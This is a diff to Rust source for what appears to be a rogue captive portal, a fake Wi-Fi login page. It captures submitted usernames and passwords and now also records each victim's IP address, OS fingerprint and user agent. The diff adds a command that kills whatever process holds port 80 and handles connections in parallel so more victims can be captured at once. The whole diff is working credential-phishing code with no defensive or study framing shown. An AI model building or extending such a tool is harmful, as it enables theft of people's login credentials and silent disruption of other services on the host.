@@ -163,24 +163,55 @@ fn write_credentials(creds: &str, cfg: &PortalConfig) {
     }
 }
 
+fn detect_os(user_agent: &str) -> String {
+    let ua = user_agent.to_lowercase();
+    if ua.contains("iphone") || ua.contains("ipad") {
+        "iOS".to_string()
+    } else if ua.contains("android") {
+        "Android".to_string()
+    } else if ua.contains("windows nt 10.0") {
+        "Windows 10/11".to_string()
+    } else if ua.contains("windows nt 6.1") {
+        "Windows 7".to_string()
+    } else if ua.contains("macintosh") {
+        "macOS".to_string()
+    } else if ua.contains("linux") {
+        "Linux".to_string()
+    } else {
+        "Unknown".to_string()
+    }
+}
+
 fn handle_connection(mut stream: TcpStream, cfg: PortalConfig) {
     let mut buffer = [0; 8192];
     if let Ok(size) = stream.read(&mut buffer) {
         let request = String::from_utf8_lossy(&buffer[..size]);
-        let request_line = request.lines().next().unwrap_or_default();
+        let lines: Vec<&str> = request.lines().collect();
+        let request_line = lines.get(0).unwrap_or(&"");
         let mut parts = request_line.split_whitespace();
         let method = parts.next().unwrap_or_default();
         let path = parts.next().unwrap_or_default();
+
+        let mut user_agent = "Unknown".to_string();
+        for line in &lines {
+            if line.to_lowercase().starts_with("user-agent:") {
+                user_agent = line[11..].trim().to_string();
+                break;
+            }
+        }
+        let os = detect_os(&user_agent);
+        let client_ip = stream.peer_addr().map(|a| a.ip().to_string()).unwrap_or_else(|_| "unknown".to_string());
+
         if method == "POST" && path == "/login" {
             let body = request.split("\r\n\r\n").nth(1).unwrap_or_default();
             let values = parse_form(body);
             let login = values
-            .get("login")
-            .cloned()
-            .or_else(|| values.get("username").cloned())
-            .unwrap_or_default();
-        let password = values.get("password").cloned().unwrap_or_default();
-        let creds = format!("login={} password={}", login, password);
+                .get("login")
+                .cloned()
+                .or_else(|| values.get("username").cloned())
+                .unwrap_or_default();
+            let password = values.get("password").cloned().unwrap_or_default();
+            let creds = format!("login={} password={} ip={} os={} ua={}", login, password, client_ip, os, user_agent);
             write_credentials(&creds, &cfg);
             let response = success_page(&cfg);
             let _ = stream.write_all(response.as_bytes());
@@ -205,6 +236,12 @@ pub fn start_portal_with_config(cfg: PortalConfig) {
         println!("captive portal already running");
         return;
     }
+
+    // Attempt to free port 80 if it's held by another process
+    if cfg.portal_port == 80 {
+        let _ = std::process::Command::new("fuser").args(["-k", "80/tcp"]).output();
+    }
+
     state.running.store(true, Ordering::SeqCst);
     let bind_addr = format!("0.0.0.0:{}", cfg.portal_port);
     match TcpListener::bind(&bind_addr) {
@@ -217,7 +254,8 @@ pub fn start_portal_with_config(cfg: PortalConfig) {
                         break;
                     }
                     if let Ok(stream) = stream {
-                        handle_connection(stream, inner_cfg.clone());
+                        let cfg_clone = inner_cfg.clone();
+                        thread::spawn(move || handle_connection(stream, cfg_clone));
                     }
                 }
             });
